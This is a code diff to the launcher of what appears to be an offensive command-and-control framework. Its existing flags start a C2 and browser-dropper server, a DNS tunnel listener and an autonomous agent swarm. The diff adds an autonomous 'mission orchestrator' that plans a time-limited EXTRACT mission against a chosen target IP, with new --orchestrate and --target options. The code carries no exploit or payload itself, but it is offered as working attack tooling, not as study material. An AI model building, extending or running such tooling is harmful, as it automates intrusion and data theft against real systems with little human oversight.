@@ -198,6 +198,25 @@ def cmd_start(args):
         except Exception as e:
             print(f"[!] Swarm Kernel initialization error: {e}")
 
+    # 4. Autonomous Mission Orchestration Pipeline (S4)
+    if getattr(args, 'orchestrate', False) or args.all:
+        try:
+            from orchestration.mission_orchestrator import MissionOrchestrator
+            from orchestration.mission_profiles import MissionProfile, MissionType
+            orchestrator = MissionOrchestrator(use_redis=False)
+            target = getattr(args, 'target', '192.168.1.100') or '192.168.1.100'
+            profile = MissionProfile(
+                mission_type=MissionType.EXTRACT,
+                target=target,
+                time_budget_seconds=120
+            )
+            mission = orchestrator.create_mission(profile)
+            stage_names = [s.name for s in mission.stages]
+            print(f"[✓] Mission Orchestrator active: Pipeline [{profile.mission_type.value}] for {target}")
+            print(f"    Stages ({len(stage_names)}): {' → '.join(stage_names)}")
+        except Exception as e:
+            print(f"[!] Mission Orchestrator error: {e}")
+
     print("\nServices operational. Press Ctrl+C to terminate.")
     try:
         while True:
@@ -398,6 +417,8 @@ def main():
     p_start.add_argument("--c2", action="store_true", help="Start C2 & browser dropper server")
     p_start.add_argument("--dns", action="store_true", help="Start UDP DNS tunnel listener")
     p_start.add_argument("--agents", action="store_true", help="Start autonomous swarm kernel")
+    p_start.add_argument("--orchestrate", action="store_true", help="Start autonomous mission orchestrator")
+    p_start.add_argument("--target", type=str, default="192.168.1.100", help="Target for orchestrated mission")
     p_start.add_argument("--port", type=int, default=8000, help="C2 HTTP port (default: 8000)")
     p_start.add_argument("--dns-port", type=int, default=5353, help="DNS UDP port (default: 5353)")
     p_start.set_defaults(func=cmd_start)
